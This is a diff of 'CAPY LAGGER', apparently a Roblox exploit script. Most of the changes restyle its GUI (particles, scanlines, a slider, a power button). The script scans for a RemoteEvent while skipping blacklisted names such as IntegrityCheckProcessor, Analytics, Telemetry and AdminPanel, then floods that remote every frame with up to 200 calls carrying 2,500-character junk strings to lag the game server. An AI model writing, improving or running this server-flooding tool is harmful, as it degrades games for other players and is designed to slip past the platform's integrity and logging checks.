@@ -1,8 +1,8 @@
 --[[
-    CAPY LAGGER: VOID APOCALYPSE (CLEAN & SECURE)
-    - Updated Blacklist: Now blocks specific UUID Remotes
-    - Visuals: Clean Void / No Shadows
-    - Logic: True 0.00s Instant Stop
+    CAPY LAGGER: VOID APOCALYPSE (FINAL FIXED)
+    - Status: Connected restored
+    - Visuals: Clean Void (No Shadow)
+    - Logic: Instant Stop (0.00s)
 ]]
 
 local Players = game:GetService("Players")
@@ -15,12 +15,8 @@ local Debris = game:GetService("Debris")
 
 local LocalPlayer = Players.LocalPlayer
 
--- // ⛔ UPDATED BLACKLIST (ADDED NEW BLOCKED REMOTES) ⛔ //
+-- // ⛔ 100% BLACKLIST ⛔ //
 local blacklistedNames = {
-    -- New Blocked Remote from your screenshot:
-    "RE/352aad58-c786-4998-886b-3e4fa390721e", "352aad58-c786-4998-886b-3e4fa390721e",
-
-    -- Standard Blacklist:
     "PlaceCooldownFromChat", "AdminPanelService", "AdminPanel", "IntegrityCheckProcessor", 
     "LocalizationTableAnalyticsSender", "LocalizationService", "Analytics", "Telemetry", 
     "Logger", "Reporter", "CanChatWith", "SetPlayerBlockList", "UpdatePlayerBlockList",
@@ -46,7 +42,7 @@ local blacklistedNames = {
     "RE/TutorialService/StartTutorial", "RE/TutorialService/FinishTutorial", "RE/TeleportService/Reconnect"
 }
 
-local State = {LagEnabled = false, Target = nil, Packets = 10, Max = 250, UUID = HttpService:GenerateGUID(false)}
+local State = {LagEnabled = false, Target = nil, Packets = 10, Max = 200, UUID = HttpService:GenerateGUID(false)}
 
 -- // UI ENGINE //
 if CoreGui:FindFirstChild("CapyApocalypse") then CoreGui.CapyApocalypse:Destroy() end
@@ -58,100 +54,103 @@ local function New(class, props, radius)
     return o
 end
 
-local function Tw(o, p, t) TweenService:Create(o, TweenInfo.new(t or 0.4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), p):Play() end
+local function Tw(o, p, t) TweenService:Create(o, TweenInfo.new(t or 0.4, Enum.EasingStyle.Quart), p):Play() end
 
--- // MAIN FRAME //
+-- // VISUAL BASE //
 local Main = New("Frame", {
-    Parent = Screen, 
-    Size = UDim2.new(0, 300, 0, 400), 
-    Position = UDim2.new(0.5, -150, 0.5, -200),
-    BackgroundColor3 = Color3.fromRGB(8, 8, 10), 
-    BorderSizePixel = 0,
-    ZIndex = 2
+    Parent = Screen, Size = UDim2.new(0, 320, 0, 420), Position = UDim2.new(0.5, -160, 0.5, -210),
+    BackgroundColor3 = Color3.fromRGB(5, 5, 5), BorderSizePixel = 0
 }, 20)
 
--- RGB Stroke
 local Stroke = New("UIStroke", {Parent = Main, Thickness = 3, Color = Color3.fromRGB(0, 255, 150)})
-local Grad = New("UIGradient", {
-    Parent = Stroke, 
-    Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 150)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 150, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 150))
-    })
-})
+local Grad = New("UIGradient", {Parent = Stroke, Color = ColorSequence.new(Color3.fromRGB(0,255,150), Color3.fromRGB(0,100,255))})
 
-task.spawn(function()
-    while Main.Parent do
-        Grad.Rotation = Grad.Rotation + 2
-        RunService.RenderStepped:Wait()
-    end
-end)
-
--- // PARTICLES //
-local Particles = New("Frame", {Parent = Main, Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 3}, 20)
-local function SpawnParticle()
-    local p = New("Frame", {
-        Parent = Particles, Size = UDim2.new(0, math.random(2,4), 0, math.random(2,4)),
-        Position = UDim2.new(math.random(), 0, 1.1, 0), 
-        BackgroundColor3 = State.LagEnabled and Color3.new(1,0,0) or Color3.new(0,1,1),
-        BorderSizePixel = 0
-    }, 10)
-    Tw(p, {Position = UDim2.new(p.Position.X.Scale, math.random(-20,20), -0.2, 0), Rotation = 360, BackgroundTransparency = 1}, math.random(2,5))
-    Debris:AddItem(p, 5)
-end
-task.spawn(function() while Main.Parent do task.wait(0.12); SpawnParticle() end end)
-
--- // HEADER //
+-- // GLITCH TITLE //
 local Title = New("TextLabel", {
     Parent = Main, Text = "CAPY LAGGER", Font = Enum.Font.GothamBlack, TextSize = 26, 
     TextColor3 = Color3.new(1,1,1), Size = UDim2.new(1, 0, 0, 60), BackgroundTransparency = 1, ZIndex = 5
 })
 
-local StatusFrame = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,26), Position = UDim2.new(0.1,0,0,60), BackgroundColor3 = Color3.new(0,0,0), ZIndex = 5}, 6)
-local StatusText = New("TextLabel", {Parent = StatusFrame, Size = UDim2.new(1,0,1,0), Text = "> STANDBY", Font = Enum.Font.Code, TextSize = 11, TextColor3 = Color3.fromRGB(0, 255, 150), BackgroundTransparency = 1})
+task.spawn(function()
+    while Main.Parent do
+        Title.Position = UDim2.new(0, math.random(-2,2), 0, math.random(-2,2))
+        task.wait(0.05)
+        Title.Position = UDim2.new(0, 0, 0, 0)
+        task.wait(2)
+    end
+end)
 
--- // REACTOR BUTTON //
-local CoreBase = New("Frame", {Parent = Main, Size = UDim2.new(0,150,0,150), Position = UDim2.new(0.5,-75,0.45,-10), BackgroundColor3 = Color3.fromRGB(15,15,20), ZIndex = 5}, 100)
-local CoreStroke = New("UIStroke", {Parent = CoreBase, Thickness = 3, Color = Color3.fromRGB(0,255,150)})
+-- // PARTICLE ENGINE //
+local Particles = New("Frame", {Parent = Main, Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, ClipsDescendants = true}, 20)
+local function SpawnParticle()
+    local p = New("Frame", {
+        Parent = Particles, Size = UDim2.new(0, math.random(2,4), 0, math.random(2,4)),
+        Position = UDim2.new(math.random(), 0, 1.1, 0), BackgroundColor3 = State.LagEnabled and Color3.new(1,0,0) or Color3.new(0,1,0.6),
+        BorderSizePixel = 0
+    }, 10)
+    Tw(p, {Position = UDim2.new(p.Position.X.Scale, math.random(-50,50), -0.2, 0), Rotation = 360}, math.random(3,6))
+    Debris:AddItem(p, 6)
+end
+task.spawn(function() while Main.Parent do task.wait(0.15); SpawnParticle() end end)
+
+-- // SCANLINE OVERLAY //
+local Scanlines = New("Frame", {
+    Parent = Main, Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1, ZIndex = 10
+}, 20)
+for i = 1, 20 do
+    New("Frame", {Parent = Scanlines, Size = UDim2.new(1,0,0,1), Position = UDim2.new(0,0,i/20,0), BackgroundColor3 = Color3.new(0,0,0), BackgroundTransparency = 0.9, BorderSizePixel = 0})
+end
+
+-- // STATUS BAR //
+local StatusFrame = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,25), Position = UDim2.new(0.1,0,0,60), BackgroundColor3 = Color3.new(0,0,0)}, 5)
+local StatusText = New("TextLabel", {Parent = StatusFrame, Size = UDim2.new(1,0,1,0), Text = "> INITIALIZING...", Font = Enum.Font.Code, TextSize = 12, TextColor3 = Color3.new(0.6,0.6,0.6), BackgroundTransparency = 1})
+
+-- // REACTOR CORE BUTTON //
+local CoreBase = New("Frame", {Parent = Main, Size = UDim2.new(0,150,0,150), Position = UDim2.new(0.5,-75,0.45,-20), BackgroundColor3 = Color3.fromRGB(15,15,20)}, 100)
+local CoreStroke = New("UIStroke", {Parent = CoreBase, Thickness = 4, Color = Color3.fromRGB(0,255,150)})
 
 local PowerBtn = New("TextButton", {
-    Parent = CoreBase, Size = UDim2.new(1,-12,1,-12), Position = UDim2.new(0,6,0,6),
-    BackgroundColor3 = Color3.fromRGB(20,20,28), Text = "", AutoButtonColor = false, ZIndex = 6
+    Parent = CoreBase, Size = UDim2.new(1,-15,1,-15), Position = UDim2.new(0,7.5,0,7.5),
+    BackgroundColor3 = Color3.fromRGB(20,20,25), Text = "", AutoButtonColor = false, ZIndex = 6
 }, 100)
 
 local CoreIcon = New("ImageLabel", {
     Parent = PowerBtn, Size = UDim2.new(0,70,0,70), Position = UDim2.new(0.5,-35,0.5,-35),
-    Image = "rbxassetid://3570695787", ImageColor3 = Color3.fromRGB(0,255,150), BackgroundTransparency = 1, ZIndex = 7
+    Image = "rbxassetid://6031068426", ImageColor3 = Color3.fromRGB(0,255,150), BackgroundTransparency = 1, ZIndex = 7
 })
 
 -- // SLIDER //
-local SliderBox = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,50), Position = UDim2.new(0.1,0,0.82,0), BackgroundTransparency = 1, ZIndex = 5})
-local SliderLab = New("TextLabel", {Parent = SliderBox, Size = UDim2.new(1,0,0,20), Text = "OVERLOAD: 10", Font = Enum.Font.GothamBold, TextSize = 12, TextColor3 = Color3.new(0.8,0.8,0.8), BackgroundTransparency = 1})
-local SliderBar = New("TextButton", {Parent = SliderBox, Size = UDim2.new(1,0,0,6), Position = UDim2.new(0,0,0,28), BackgroundColor3 = Color3.fromRGB(30,30,35), Text = ""}, 5)
+local SliderBox = New("Frame", {Parent = Main, Size = UDim2.new(0.8,0,0,50), Position = UDim2.new(0.1,0,0.8,0), BackgroundTransparency = 1})
+local SliderLab = New("TextLabel", {Parent = SliderBox, Size = UDim2.new(1,0,0,20), Text = "OVERLOAD: 10", Font = Enum.Font.GothamBold, TextSize = 13, TextColor3 = Color3.new(0.8,0.8,0.8), BackgroundTransparency = 1})
+local SliderBar = New("TextButton", {Parent = SliderBox, Size = UDim2.new(1,0,0,6), Position = UDim2.new(0,0,0,30), BackgroundColor3 = Color3.fromRGB(30,30,35), Text = ""}, 5)
 local SliderFill = New("Frame", {Parent = SliderBar, Size = UDim2.new(0.1,0,1,0), BackgroundColor3 = Color3.fromRGB(0,255,150)}, 5)
 
--- // LOGIC ENGINE //
+-- // LOGIC //
 local function UpdateUI(on)
     if on then
-        Tw(CoreBase, {BackgroundColor3 = Color3.fromRGB(60,10,10)})
+        Tw(CoreBase, {BackgroundColor3 = Color3.fromRGB(40,10,10)})
         Tw(CoreStroke, {Color = Color3.new(1,0,0)})
-        Tw(CoreIcon, {ImageColor3 = Color3.new(1,1,1)})
+        Tw(CoreIcon, {ImageColor3 = Color3.new(1,1,1), Rotation = 180})
         Tw(Stroke, {Color = Color3.new(1,0,0)})
-        StatusText.Text = "> !! OVERLOAD ACTIVE !!"
+        StatusText.Text = "> !! SYSTEM OVERLOAD !!"
         StatusText.TextColor3 = Color3.new(1,0,0)
     else
         Tw(CoreBase, {BackgroundColor3 = Color3.fromRGB(15,15,20)})
         Tw(CoreStroke, {Color = Color3.fromRGB(0,255,150)})
-        Tw(CoreIcon, {ImageColor3 = Color3.fromRGB(0,255,150)})
+        Tw(CoreIcon, {ImageColor3 = Color3.fromRGB(0,255,150), Rotation = 0})
         Tw(Stroke, {Color = Color3.fromRGB(0,255,150)})
-        StatusText.Text = "> STANDBY"
-        StatusText.TextColor3 = Color3.new(0,1,0.6)
+        if State.Target then
+            StatusText.Text = "> CONNECTED: "..State.Target.Name
+            StatusText.TextColor3 = Color3.new(0,1,0.6)
+        end
     end
 end
 
 PowerBtn.MouseButton1Click:Connect(function()
-    if not State.Target then return end
+    if not State.Target then 
+        Tw(Main, {Position = UDim2.new(0.5,-165,0.5,-210)}, 0.05) task.wait(0.05) Tw(Main, {Position = UDim2.new(0.5,-155,0.5,-210)}, 0.05) 
+        return 
+    end
     State.LagEnabled = not State.LagEnabled
     UpdateUI(State.LagEnabled)
 end)
@@ -166,7 +165,10 @@ RunService.RenderStepped:Connect(function()
         SliderFill.Size = UDim2.new(p,0,1,0)
         State.Packets = math.max(1, math.floor(p * State.Max))
         SliderLab.Text = "OVERLOAD: "..State.Packets
-        SliderFill.BackgroundColor3 = Color3.fromHSV((1-p)*0.35, 1, 1)
+        SliderFill.BackgroundColor3 = Color3.fromHSV((1-p)*0.3, 1, 1)
+    end
+    if State.LagEnabled then
+        CoreBase.Position = UDim2.new(0.5,-75 + math.random(-1,1),0.45,-20 + math.random(-1,1))
     end
 end)
 
@@ -178,7 +180,6 @@ local function Scan()
             local path = obj:GetFullName()
             local bad = false
             for _, b in ipairs(blacklistedNames) do
-                -- Проверка наличия части строки в полном пути или имени
                 if string.find(path, b, 1, true) then bad = true break end
             end
             if not bad then target = obj break end
@@ -186,24 +187,23 @@ local function Scan()
     end
     State.Target = target
     if target then
-        StatusText.Text = "> LINKED: "..target.Name
-        StatusText.TextColor3 = Color3.fromRGB(0,255,150)
+        StatusText.Text = "> CONNECTED: "..target.Name
+        StatusText.TextColor3 = Color3.new(0,1,0.6)
     else
         StatusText.Text = "> !!! NOT SUPPORTED !!!"
         StatusText.TextColor3 = Color3.new(1,0,0)
         CoreStroke.Color = Color3.new(0.2,0,0)
         CoreIcon.ImageColor3 = Color3.new(0.2,0,0)
         Tw(Stroke, {Color = Color3.new(1,0,0)})
-        PowerBtn.BackgroundColor3 = Color3.new(0,0,0)
+        Grad.Enabled = false
     end
 end
 
--- // INSTANT STOP LAG ENGINE (0.00s) //
+-- // CORE LAG ENGINE //
 RunService.Heartbeat:Connect(function()
     if not State.LagEnabled or not State.Target then return end
-    local p = string.rep("X", 2000)
+    local p = string.rep("X", 2500)
     for i = 1, State.Packets do
-        -- Критическая проверка для моментальной остановки
         if not State.LagEnabled then break end
         pcall(function() State.Target:FireServer(State.UUID, p) end)
     end
@@ -215,4 +215,4 @@ Main.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.Mouse
 UserInputService.InputChanged:Connect(function(i) if d and i.UserInputType==Enum.UserInputType.MouseMovement then local delta=i.Position-s; Main.Position=UDim2.new(sp.X.Scale,sp.X.Offset+delta.X,sp.Y.Scale,sp.Y.Offset+delta.Y) end end)
 UserInputService.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then d=false end end)
 
-task.wait(0.5); Scan()
+task.wait(1); Scan()
